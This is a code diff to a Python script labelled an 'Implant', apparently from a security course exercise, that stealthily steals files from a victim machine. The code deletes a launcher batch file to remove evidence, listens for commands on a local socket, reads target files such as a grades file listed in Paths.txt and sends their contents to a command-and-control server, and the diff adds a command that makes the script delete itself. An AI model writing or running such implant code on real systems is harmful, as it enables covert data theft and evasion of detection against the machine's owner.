@@ -1,9 +1,12 @@
 import os
+from os import remove
+from sys import argv
 import requests
 import socket
 import sys
 
 print("Implant Running")
+
 #Remove evidence of script.bat from the start
 try:
     os.remove("script.bat")
@@ -16,6 +19,7 @@ with open('Paths.txt', 'w') as f:
     f.write('C:\\Users\\CS590J\\Desktop\\Student Files\\Grades.txt\n')
     f.close()
 
+#function returns the command recieved by the victim implant listener
 def recieve_command():
     connection, client_address = implant_socket.accept()
     try:
@@ -30,7 +34,7 @@ def recieve_command():
         print("Connection Closed")
         connection.close()
 
-
+#function sends data passed to it to the c2
 def send_exfil(data):
     try:
         # Send data
@@ -42,19 +46,18 @@ def send_exfil(data):
 
 
 
-# Create a TCP/IP socket
+# Create a TCP/IP socket for the victim implant
 implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# Bind the socket to the port
+# Bind the socket to the port and listen
 implant_server_address = ('localhost', 10000)
 implant_socket.bind(implant_server_address)
-
 implant_socket.listen(1)
 
 while(True):
-    comm = recieve_command()
-    print(comm)
+    comm = recieve_command().decode("utf-8")
+    print("Recieved Command: ", comm)
 
-    if(True):
+    if(comm == "2"):
         file1 = open('Paths.txt', 'r')
         Lines = file1.readlines()
         file1.close()
@@ -78,3 +81,8 @@ while(True):
         #in case of error
         except:
             print("error")
+
+    if(comm == "1"):
+        remove(argv[0])
+        exit()
+        
